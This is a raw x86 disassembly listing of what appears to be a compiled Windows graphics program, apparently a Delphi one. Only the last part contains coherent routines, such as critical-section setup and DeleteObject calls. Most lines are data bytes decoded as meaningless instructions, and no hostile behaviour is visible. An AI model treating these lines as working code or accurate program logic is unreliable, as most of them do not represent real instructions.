arpl [ eax + edi + 0x2d ] si
inc edx
add al bh
inc cx
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc ecx
add [ esp + esi ] dh
outsb
je r-xdata
dec ebp
jb r-xdata
add [ ebx ] al
outsb
popad
imul esp [ ebx + 0x73 ] 0x422d3890
inc esi
insb
or esp [ edx + 0x73 ]
dec ebp
popad
jae r-xdata
outsd
popad
insb
dec esi
outsd
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al 0x0
je r-xdata
popad
inc edx
add [ ebp + ebp + 0x42 ] bl
add [ edi ] al
add [ eax ] cl
inc edi
jb r-xdata
add [ eax + eax ] ah
add [ eax ] al
in al dx
xor ch [ esi ]
inc edx
jo r-xdata
add [ ebp + ebp + 0x42 ] cl
insb
dec esi
outsd
or dh [ gs : eax + 0x6d ]
or [ edi + 0x72 ] al
popad
jo r-xdata
insb
lea eax [ eax ]
mov [ edi ] ch
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x422f ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + ebp + 0x1c0042 ] dl
add [ eax ] al
in al dx
sub al 0x42
add [ esp + esi ] dh
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ ebx + ecx * 2 + 0x42 ] al
add [ esi + eax * 2 + 0x42 ] ch
sub [ edx ] eax
sbb [ eax ] al
add bh bh
test al 0x47
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050001 ] al
outsd
insb
outsd
jb r-xdata
mov eax 0xb800422a
dec ecx
inc edx
add al dl
imul esp [ ebx + 0x73 ] 0x2ac80007
inc edx
add al dl
dec edx
inc edx
add al bl
dec edx
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070000 ] al
push 0x65737261
je r-xdata
dec ecx
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4e040003 ] al
popad
insd
je r-xdata
add al [ eax ]
push es
dec eax
jo r-xdata
sub al 0x42
add [ esp + esi ] dh
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax ] ch
imul esp [ ebx + 0x73 ] 0xc08b0000
mov [ 0xf0f0042 ] gs
dec ecx
inc ebx
push 0x65676e61
dec esi
outsd
je r-xdata
cwde
dec ebp
inc edx
add [ eax + 0x100424d ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add eax [ eax ]
add eax 0x74646957
push 0x3088c08b
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4230 ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + esi + 0x180042 ] dl
add [ eax ] al
in al dx
sub al 0x42
add [ esp + esi ] dh
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ esi + ecx * 2 ] cl
inc edx
add [ esp + edx * 4 - 0x6b3bffbf ] bh
inc ecx
add [ esi + ecx * 2 ] dh
inc edx
add [ esi ] al
push esp
inc edx
jb r-xdata
imul esp [ ebx + 0x73 ] 0x29980004
inc edx
add [ esp + ecx * 2 + 0x4c940042 ] cl
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
add eax 0x6f6c6f43
jb r-xdata
add eax 0x63746950
push r-xdata
sub al 0x4a
inc edx
add [ eax + 0x4a ] cl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53040005 ] al
imul edi [ edx + 0x65 ] r-xdata
push 0x7400424a
dec edx
inc edx
add [ eax ] al
add [ eax + eax ] al
imul esp [ gs : edi + 0x68 ] 0x422ab874
add [ eax - 0x2fffbdb7 ] bh
adc [ eax ] al
mov [ ecx + 0x42 ] cl
add [ eax + 0x1004249 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48060002 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax 0x69530400
jpe r-xdata
inc edx
add [ eax - 0x57ffbdb6 ] ah
dec edx
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
inc esi
inc edx
add [ esp + edx * 4 - 0x6b3bffbf ] bh
inc ecx
inc eax
add [ eax + 0x28004031 ] ah
imul sp [ ebp + 0x72 ] 0x1194
inc eax
add [ ecx ] al
and [ ebx ] esp
mov dh 0x1f
cmpsd [ esi ] [ edi ]
inc esp
rcl [ ecx ] 0x1
sahf
xchg ebx eax
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4708da82
jb r-xdata
add [ eax ] al
jae r-xdata
add [ esp + edx * 2 ] al
push eax
outsb
lea eax [ eax ]
mov al [ 0x700422f ]
add al 0x54
push eax
outsb
mov [ edi ] ch
inc edx
add [ ebp + ebp + 0x42 ] bl
add [ eax + eax ] al
insb
dec ebx
inc edx
sub eax [ edx ]
sbb [ eax ] al
add bh bh
push esp
dec ebp
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax ] 0x0
add [ ecx ] al
add [ ecx * 2 + 0x4c65646f ] al
sub eax [ edx ]
push 0x7000424d
dec ebp
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al [ eax ]
add eax 0x6c797453
push esp
adc [ eax ] al
add [ esp + edx * 4 - 0x6b3bffbf ] bh
inc ecx
add [ ebx + ecx * 2 + 0x42 ] ch
inc eax
add [ eax + 0x44004031 ] ah
dec ebx
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53050006 ] al
je r-xdata
xor al 0x2b
inc edx
add [ eax + 0x4a ] ch
inc edx
add [ edx + ecx * 2 + 0x42 ] dh
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x2000422d ] cl
add [ eax ] al
add [ ecx ] al
add ch bh
jo r-xdata
add [ eax - 0x77ffbfcf ] ah
push ecx
inc edx
add [ esp + edx * 4 - 0x6b3bffbf ] bh
inc ecx
add al bl
xchg ebx eax
inc ecx
add [ eax + ebx * 2 + 0x58800042 ] dl
inc edx
add [ edi + edx * 2 + 0x54070042 ] dh
inc ebx
popad
outsb
jbe r-xdata
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x31 ] dh
nop
mov al [ 0x7004230 ]
push es
push esp
inc edx
jb r-xdata
jns r-xdata
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx + esi + 0x42 ] ah
add [ eax ] bl
add [ eax ] al
test [ esi + 0x41 ] ah
add [ esp + esi ] dh
jae r-xdata
jb r-xdata
outsd
cmp [ gs : esi ] ch
inc edx
add [ eax + eax ] cl
add bh bh
outsd
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add al [ eax ]
add al 0x46
xor [ edx ] eax
pop es
pop es
push esp
inc ebx
popad
outsb
jbe r-xdata
jo r-xdata
mov [ eax ] dh
inc edx
add [ ebp + ebp + 0x42 ] bl
add [ edx ] al
add [ eax ] cl
inc edi
jb r-xdata
popad
jae r-xdata
add [ eax + esi + 0x140042 ] bl
das
inc edx
add [ eax ] dl
add [ eax ] al
[ eax + 0x56 ]
pop eax
push esi
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040002 ] al
jae r-xdata
add [ eax ] al
add [ eax ] al
jo r-xdata
push eax
mov eax [ eax ]
mov eax [ eax + 0x58 ]
jb r-xdata
add [ gs : bp + di ] cl
push eax
jb r-xdata
push ebx
je r-xdata
outsb
je r-xdata
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42050000 ] al
jb r-xdata
add [ eax ] eax
or [ ebx + 0x6f ] al
jo r-xdata
xor [ edx ] eax
clc
inc cx
add [ eax + eax ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax - 0x43ffbdaf ] cl
xchg esp eax
xor [ fs : edx ] eax
pop eax
add [ eax ] al
add [ esi + 0x34340041 ] al
imul esp [ ebx + 0x73 ] 0x29980002
inc edx
add [ edi + ecx * 2 + 0x42 ] ch
add [ edi + ecx * 2 + 0x42 ] dh
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
inc [ eax ]
add [ eax ] al
add eax 0x6f6c6f43
jb r-xdata
xchg [ esp ] eax
jae r-xdata
xchg [ esp ] eax
inc eax
pop eax
outsb
je r-xdata
push cs
add [ gs : bx + si ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] dl
xor al [ edx ]
or dh [ eax + 0x73 ]
push ebx
je r-xdata
popad
jae r-xdata
or [ eax + 0x73 ] dh
inc ebp
dec ebp
add bh bh
je r-xdata
imul esp [ ebx + 0x73 ] 0x309c0004
inc edx
add [ eax + eax ] dl
inc ecx
add ah al
xchg esp eax
sub al 0x42
add [ eax - 0x6fffbdb0 ] cl
push eax
inc edx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] eax
add eax 0x6c797453
lea eax [ eax ]
dec esp
xor [ edx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
retn
push ebx
je r-xdata
add ah ah
outsd
outsb
add al 0x42
jns r-xdata
jb r-xdata
jb r-xdata
push esp
push eax
jb r-xdata
push esp
adc [ eax ] al
and [ eax ] al
add bh bh
and [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0xcc0020 ] al
push esp
push edx
arpl [ gs : edx + eax + 0x3 ] si
dec ebp
imul esp [ ebx + 0x73 ] r-xdata
or [ esi ] cl
push esp
push eax
jb r-xdata
retn
add al 0x24
add [ gs : ecx ] cl
push edx
jb r-xdata
ja r-xdata
imul ebp [ esi + 0x67 ] 0x52737009
jne r-xdata
outsd
jb r-xdata
sbb esi [ ebx ]
inc edx
add cl ch
xor al [ edx ]
div [ edx ]
inc edx
add [ ecx ] al
add [ eax ] al
push es
inc eax
jb r-xdata
jmp [ eax + 0xc ]
outsd
ja r-xdata
outsb
imul ebp [ fs : esi + 0x67 ] 0x61724708
jo r-xdata
outsb
imul ebp [ esi + 0x67 ] 0x45737008
push ebx
inc esi
add [ eax ] al
add eax 0xffffffd8
jmp r-xdata
inc edx
add [ eax ] ah
sub al [ eax ]
aam 0x6f
inc edx
add al bl
outsd
inc edx
add [ eax ] ah
sub al [ eax ]
call 0xffffffffb0427660
insb
inc edx
add ah dh
outsb
inc edx
add [ edi + ebp * 2 + 0x42 ] bh
add [ eax ] ah
sub al [ eax ]
and [ edx ] ch
inc eax
add [ eax ] ah
sub al [ eax ]
and [ edx ] ch
inc eax
add [ ecx ] al
add ch bh
dec [ eax + 0x6f ]
inc edx
add [ eax ] cl
push esp
inc edi
jb r-xdata
add [ ebx + 0x7ab8cd12 ] ah
add [ eax ] dl
xor al [ edx ]
insb
adc [ eax ] al
add [ eax ] dl
inc eax
add [ eax ] al
add [ eax ] al
imul ebp [ esi + 0x67 ] 0x40117400
jb r-xdata
jae r-xdata
adc al [ ecx ]
push edx
add eax 0x63655254
je r-xdata
inc edx
outsd
outsd
insb
popad
outsb
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_427874
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x58 ]
pop edi
pop esi
retn
push ebp
xor al 0x42
add [ ebx + 0x34 ] ah
inc edx
add [ ebp + 0x34 ] ch
inc edx
jo r-xdata
aam 0x11
sbb edx 0x0
ror [ edi + 0x60 ] 0xb2
frstor [ esi ]
xor eax [ edx ]
and al 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax eax
test al 0x33
inc edx
add [ edx ] bh
xor eax [ edx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and al 0x34
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + esi ] cl
inc edx
add [ esp + esi ] dl
inc edx
add [ eax ] ch
add [ eax ] al
add [ edi + 0x41 ] dh
add [ esp + esi ] dh
inc eax
add [ ebp + edx * 4 + 0x41 ] bh
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ ebx + edx * 4 - 0x6b43ffbf ] ch
inc ecx
add [ eax + 0x6d ] bl
inc edx
add al bl
xchg ebx eax
inc ecx
add [ esi + edx * 4 ] cl
inc ecx
add al ch
insb
inc edx
add [ eax ] ah
sub al [ eax ]
movsb [ edi ] [ esi ]
insd
inc edx
add [ eax ] ah
sub al [ eax ]
and [ edx ] ch
inc eax
add ah ch
outsb
inc edx
add al dh
outsb
inc edx
add [ eax ] ah
sub al [ eax ]
jo r-xdata
add dh dh
xor al [ edx ]
add [ eax ] eax
add [ eax ] al
mov [ 0x7ab8cd12 ] eax
outsb
add [ si + 0x11 ] dh
add [ eax ] al
adc [ eax ] al
add [ eax ] al
add [ eax ] al
in al 0x10
inc eax
add [ eax - 0x233f7c34 ] dl
push eax
mov eax [ eax ]
mov eax [ eax + 0x54 ]
inc ebp
jbe r-xdata
jae r-xdata
push ebx
je r-xdata
add ecx [ ebp + 0x73 ]
push es
arpl [ ebp + esi * 2 + 0x72 ] si
cld
xor al 0x42
add al bh
inc ecx
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
inc ecx
add [ esp + esi ] dh
inc eax
add [ ebp + edx * 4 + 0x41 ] bh
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ edi + esi * 2 + 0x77dc0042 ] ch
inc edx
add [ ebp + edi * 2 + 0x7ad00042 ] cl
inc edx
add [ esi + edx * 4 ] cl
inc ecx
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + 0x1800422d ] cl
add [ eax ] al
add [ edx ] al
add ch bh
add [ ebp + 0x34 ] al
inc edx
add [ ebp + 0x34 ] cl
inc edx
add [ ecx ] al
add [ eax ] al
add [ ebx + 0x7ab8cd12 ] ah
aam 0x11
xor al 0x42
imul esp [ ebx - 0x73 ] 0x34240040
inc edx
add [ edi ] al
or [ edi + eax * 2 + 0x72 ] dl
popad
jo r-xdata
je r-xdata
outsb
je r-xdata
pop eax
inc edx
add [ eax - 0x4bffbda8 ] al
push edi
jo r-xdata
int 0xb8
jpe r-xdata
imul esp [ ebx - 0x58 ] 0xf8004233
inc ecx
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
push es
or [ esi ] al
push ebx
outsb
jb r-xdata
add [ esp + esi ] dh
imul bp [ ebp + 0x43 ] 0x6e61
jbe r-xdata
inc edx
add [ edi ] cl
push esp
dec ebp
je r-xdata
imul esp [ ebx + 0x73 ] 0xa8900000
xor eax 0x42
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0x35
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al al
xor eax 0x5c0042
add [ eax ] al
add [ ecx ] dh
inc edx
add [ esp + esi ] dh
inc eax
add [ eax + 0x34 ] al
xor eax 0x352c0042
inc edx
add [ eax + eax ] ch
add [ eax ] al
je r-xdata
inc edx
add [ esi + 0x42 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
push ds
sbb edx 0x0
aam 0x11
ror [ edi + 0x60 ] 0xb2
fnstsw [ edx + 0x34 ]
inc edx
add [ eax ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0x4234fcc0 ] cl
jo r-xdata
push esp
push eax
jb r-xdata
add [ 0x67617453 ] al
push cs
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + eax + 0x5 ] si
push ebx
je r-xdata
xor al 0x40
add [ esi + edi * 2 + 0x42 ] al
add [ esi ] cl
push esp
dec ebp
je r-xdata
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add ah bl
inc esp
xor al 0x40
jae r-xdata
add [ esi + 0x4234 ] cl
add [ eax ] al
add [ esi + 0x353c0042 ] cl
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi ] bl
sub [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax eax
cld
xor al 0x42
imul esp [ ebx + 0x73 ] 0xcc900000
add eax 0xffffffd8
jmp r-xdata
adc [ eax ] al
nop
int3
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add ah al
add [ edx ] sub_4194bc
pop eax
insd
inc edx
add ah dh
add [ edx ] sub_41960c
call 0xffffffff88427989
add [ edx ] 0xa4
dec eax
xor al 0x40
inc edx
add [ edi + ecx * 4 + 0x42 ] ah
add [ ecx ] cl
push esp
dec ebp
je r-xdata
insd
inc edx
add [ eax ] al
test [ edx ] al
sbb [ edx + eax * 2 + 0x4284ac00 ] al
add al dh
outsb
inc edx
add [ eax ] bh
test [ edx ] eax
sbb [ esi - 0x75bbffbe ] al
inc edx
add ah dl
outsd
inc edx
add [ eax ] dh
mov eax [ edx ]
xor al 0x8b
inc edx
add [ esp + ecx * 4 - 0x7e83ffbe ] cl
inc edx
add ah dh
outsb
inc edx
add ah dl
mov [ edx ] al
pushfd
test [ edx ] eax
cwde
mov [ edx ] eax
loopne r-xdata
add [ esi + edx * 4 ] cl
inc ecx
add al ch
insb
inc edx
add [ eax - 0x5bffbd7e ] cl
add [ ebp + edx * 4 + 0x41 ] bh
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
imul bp [ ebp + 0x49 ] 0x616d
nop
or [ edi ] dh
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + esi + 0x42 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + esi + 0x42 ] ch
add [ eax ] dh
add [ eax ] al
add [ ebx + esi + 0x42 ] bl
add [ esp + esi ] dh
inc eax
add [ edx ] sub_4194bc
les edx [ ecx + eax * 2 + 0x4193d800 ]
add [ eax + ebx * 2 + 0x58800042 ] dl
inc edx
add [ edi + edx * 2 + 0x540f0042 ] dh
xor eax 0xf070042
push esp
dec ebp
je r-xdata
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_427874
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
pop esi
pop ebx
retn
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax - 0x13ffbd6d ] dl
imul bp [ ebp - 0x75 ] 0x7cc0
aaa
inc edx
add [ edi ] al
or [ ebp + ecx * 2 + 0x65 ] edx
je r-xdata
xor [ eax ] eax
and [ edx ] ch
inc eax
add [ esp + edx * 2 ] cl
push ebx
push 0x64657261
dec ecx
insd
popad
lea eax [ bx + si ]
test al 0x36
inc edx
test [ ecx ] dh
inc eax
add [ eax - 0x23ffbfcf ] ah
imul bp [ ebp + 0x43 ] 0x6e61
jbe r-xdata
popad
nop
jo r-xdata
xchg ebx eax
inc edx
add [ esp + edx * 2 ] cl
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x616d4970
nop
xchg ebx eax
inc edx
add ah ch
imul bp [ ebp + 0x8 ] 0x4237
add [ eax ] ah
xor al 0x42
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
cmp [ edx ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
imul esp [ ebx + 0x73 ] 0xc08b0000
xor [ ecx ] bh
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + edi ] dh
inc edx
add [ eax ] bl
add [ eax ] al
add ah bh
xor eax 0x34340042
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ edi + esi * 4 + 0x42 ] ah
add [ edi + esi * 4 + 0x540a0042 ] dl
dec ecx
arpl [ edi + 0x6e ] bp
dec ecx
insd
lea eax [ bx + si ]
dec eax
cmp [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
les edi [ eax ]
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3c004238 ] bh
popad
jo r-xdata
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax ] dh
xor eax 0x316c0042
inc edx
add [ eax + eax ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
add [ eax ] al
add [ ebx + esi + 0x42 ] bl
add [ esp + esi ] dh
inc eax
add [ ebp + edx * 4 + 0x41 ] bh
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ esi + ebx * 4 + 0x42 ] bh
add [ esp + edx * 4 + 0x6d580041 ] bh
inc edx
add [ eax + 0xc00429e ] bh
xchg esi eax
inc ecx
add [ eax - 0x5ef3ffbe ] cl
inc edx
add [ ebp + ebp * 2 - 0x5c3fffbe ] ah
inc edx
add [ esp + 0x42 ] dh
add [ esp + 0x6ef00042 ] dh
inc edx
add [ eax ] dl
movsd [ edi ] [ esi ]
inc edx
add [ ecx + ebp * 4 + 0x42 ] bl
add [ eax - 0x4f ] bl
inc edx
add [ edx + esi * 4 ] ch
inc edx
add al bl
outsd
inc edx
add [ eax - 0x4d ] dl
inc edx
add [ ebx + esi * 4 - 0x61ebffbe ] ah
inc edx
add ah dh
outsb
inc edx
add [ edi + ebp * 2 + 0x42 ] bh
add al bl
cmpsd [ esi ] [ edi ]
inc edx
add [ esi + esi * 4 - 0x58abffbe ] bh
inc edx
add ah al
mov dh 0x42
add [ esp ] ah
inc edx
add [ esp - 0x4fdfffbe ] al
inc edx
add [ edi ] al
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x4238c470
add [ edi ] al
pop es
push esp
inc edx
imul esi [ ebp + ebp * 2 + 0x61 ] 0x42384870
add [ eax ] ah
xor al 0x42
add [ eax ] al
add [ eax ] cl
inc edi
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah al
cmp [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax 0x3c004238
imul esp [ ebx + 0x73 ] 0x37e80000
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
aaa
inc edx
add [ eax + eax ] dh
add ah bh
xor eax 0x34340042
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + esi + 0x240042 ] ch
add [ eax ] al
cld
xor eax 0x34340042
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add [ eax ] cl
jle r-xdata
inc edx
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
imul esp [ ebx + 0x73 ] 0xc08b0000
dec eax
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + esi + 0x42 ] cl
add [ eax ] cl
add [ eax ] al
add [ eax ] ah
adc [ eax ] eax
xor al 0x34
sub_423a2e
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x3a ] bh
inc edx
add [ eax + eax ] ah
add [ eax ] al
and [ ecx ] dl
inc eax
add [ esp + esi ] dh
inc eax
add [ eax + 0x34 ] al
inc eax
add [ esp + esi + 0x40 ] al
add [ eax + 0x34 ] cl
inc eax
add [ esp + esi ] bh
inc eax
add [ ecx + esi + 0x31a00040 ] al
inc eax
add ah bl
cmp al [ edx ]
adc [ edx + edx * 2 + 0x65 ] dl
jae r-xdata
daa
jne r-xdata
jle r-xdata
arpl [ ebp + 0x4d ] sp
popad
outsb
popad
jb r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
add [ ebp + 0x3b0e74c0 ] al
add eax rw-data
je r-xdata
inc eax
add [ ecx + 0x31c289d1 ] cl
shl [ esi - 0x3f ] 0xc0
add eax 0x49420232
retn
push eax
call DeleteObject
jne r-xdata
rol ax 0x5
xor al [ edx ]
inc edx
dec ecx
retn
sub_423aa0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
mov [ esi + 0x20 ] cx
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403550
mov eax esi
pop esi
pop ebx
retn
call sub_4035a8
pop [ fs : 0x0 ]
add esp 0xc
sub_423adc
push ebx
push esi
call sub_4035b8
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035a0
sub_423b18
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
movzx edx [ eax + 0x20 ]
mov eax ebx
call sub_423a8c
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_423b00
xor edx edx
push ebp
push sub_423bec
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp si [ eax + 0xc ]
jne r-xdata
mov eax [ ebp - 0x8 ]
inc [ eax + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423bf3
mov eax [ ebp - 0x4 ]
call sub_423b0c
retn
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x20 ]
add eax 0x10
call sub_40276c
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4 ]
mov [ eax ] edx
xor edx edx
mov [ eax + 0x4 ] edx
mov edx [ ebx ]
mov [ eax + 0x8 ] edx
mov [ eax + 0xc ] si
mov edx [ ebp - 0x4 ]
movzx ecx [ edx + 0x20 ]
